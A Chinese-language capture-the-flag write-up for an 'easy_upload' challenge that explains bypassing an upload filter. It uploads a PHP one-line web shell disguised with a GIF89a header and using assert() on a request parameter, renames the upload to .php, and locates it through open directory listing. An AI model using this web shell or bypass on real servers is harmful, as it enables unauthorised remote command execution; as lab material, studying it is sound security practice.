# 解题过程

## 绕过过滤并上传

访问页面，查看源代码

![image-20230324163954417.png (472×195) (raw.githubusercontent.com)](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/[catf1ag]easy_upload/image-20230324163954417.png)

![image-20230324163954417.png (472×195) (raw.githubusercontent.com)](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/[catf1ag]easy_upload/image-20230324164043141.png)

![image-20230324163954417.png (472×195) (raw.githubusercontent.com)](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/[catf1ag]easy_upload/image-20230324164100050.png)

上传一句话木马，并将`no`修改为`yes`

```php
GIF89a
<?=
assert($_REQUEST['cmd']);
?>
```



![image-20230324163954417.png (472×195) (raw.githubusercontent.com)](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/[catf1ag]easy_upload/image-20230324164348718.png)

至于为啥使用`assert`而不是`eval()`，因为有过滤

![image-20230324163954417.png (472×195) (raw.githubusercontent.com)](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/[catf1ag]easy_upload/image-20230324164254419.png)

![image-20230324163954417.png (472×195) (raw.githubusercontent.com)](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/[catf1ag]easy_upload/image-20230324164554364.png)

## 解决恶心点——时间戳恶魔

如果你看过abcde师傅的wp，那么现在恭喜你看到我的wp就不用被恶心了

绕过过滤上传后发文件被重名命为了`时间戳.php`,但是实际上后缀是没有被从命名的，抓包后还是要修改后缀为`.php`

最后的最后我本人是疯狂试都没有成功，被恶心坏了气急败坏的贱了一手，出来的结果让我崩溃了

![1](https://pic1.zhimg.com/80/v2-24e1b60ad8308775bfe14a4f2a8c5ae7_720w.webp?source=1940ef5c)

**我只能说，不需要时间戳，直接访问`/uploads`就可以了，apache并没有关闭目录浏览**

![image-20230324163954417.png (472×195) (raw.githubusercontent.com)](https://raw.githubusercontent.com/lanchuangdexingjian/Blog-libray/main/[catf1ag]easy_upload/image-20230324164821920.png)

最后蚁剑连接或者手动执行命令即可，flag在`index.php`中

QAQ我为啥没早点试试